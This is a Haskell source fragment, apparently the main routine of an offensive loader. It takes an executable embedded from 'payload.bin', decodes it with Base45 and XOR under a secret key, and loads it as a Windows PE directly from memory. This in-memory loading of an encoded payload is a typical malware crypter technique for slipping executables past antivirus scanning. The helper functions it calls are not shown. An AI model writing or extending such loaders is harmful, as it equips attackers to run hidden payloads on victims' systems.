main :: IO ()
main = do
  hSetBuffering stdout LineBuffering
  hSetBuffering stderr LineBuffering

  putStrLn "[*] Starting PE loader with Base45 + XOR decoding"
  let encodedPayload = $(embedFile "payload.bin")
  
  putStrLn $ "[*] Embedded payload size: " ++ show (BS.length encodedPayload) ++ " bytes"
  putStrLn $ "[*] Secret key length: " ++ show (BS.length secretKey)
  hFlush stdout

  -- Step 1: Base45 decode
  putStrLn "[*] Decoding Base45..."
  hFlush stdout
  
  base45Decoded <- case decodeBS encodedPayload of
    Left err -> do
      putStrLn $ "[!] Base45 decode failed: " ++ err
      hFlush stdout
      exitFailure
    Right decoded -> do
      putStrLn $ "[*] Base45 decoded successfully."
      hFlush stdout
      return decoded

  -- Step 2: XOR decode
  putStrLn "[*] Decoding XOR..."
  hFlush stdout
  let peBytes = xorDecode secretKey base45Decoded
  putStrLn $ "[*] XOR decoded: " ++ show (BS.length peBytes) ++ " bytes"
  hFlush stdout

  -- Step 3: Load the PE
  putStrLn "[*] Attempting to load PE from memory..."
  hFlush stdout

  maybeResult <- timeout loaderTimeoutMicros (try (loadPEFromMemory peBytes) :: IO (Either SomeException ()))
  
  case maybeResult of
    Nothing -> do
      putStrLn $ "[!] PE loader timed out after " ++ show (loaderTimeoutMicros `div` 1000000) ++ " seconds."
      hFlush stdout
      exitFailure
    Just result -> case result of
      Left ex -> do
        putStrLn $ "[!] Exception during PE loading: " ++ show ex
        hFlush stdout
        exitFailure
      Right _ -> do
        putStrLn "[*] PE loader finished."
        hFlush stdout
